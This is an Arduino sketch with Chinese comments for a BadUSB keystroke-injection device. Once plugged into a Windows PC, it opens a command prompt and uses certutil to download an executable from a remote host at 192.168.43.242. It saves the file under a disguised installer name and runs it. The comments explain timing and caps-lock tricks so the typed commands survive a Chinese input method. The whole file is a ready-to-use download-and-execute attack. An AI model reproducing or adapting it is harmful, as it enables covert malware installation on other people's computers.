#include<Keyboard.h>
void setup()
{
  Keyboard.begin();//开始键盘通信
  delay(4000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键
  delay(500);
  Keyboard.press('r');//按下r键
  delay(500);
  Keyboard.println("cmd.exe");
  delay(1000);
  Keyboard.println("certutil -urlcache -split -f http://192.168.43.242/wwy.exe D:\\setup_11.5.0.exe");
  delay(1000);
  delay(1000);
  Keyboard.println("D:\\SETUP_11.5.0.EXE");
  delay(500);
  Keyboard.println("exit");
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
  delay(400);
  Keyboard.end();//结束键盘通讯

}
void loop()
{
}
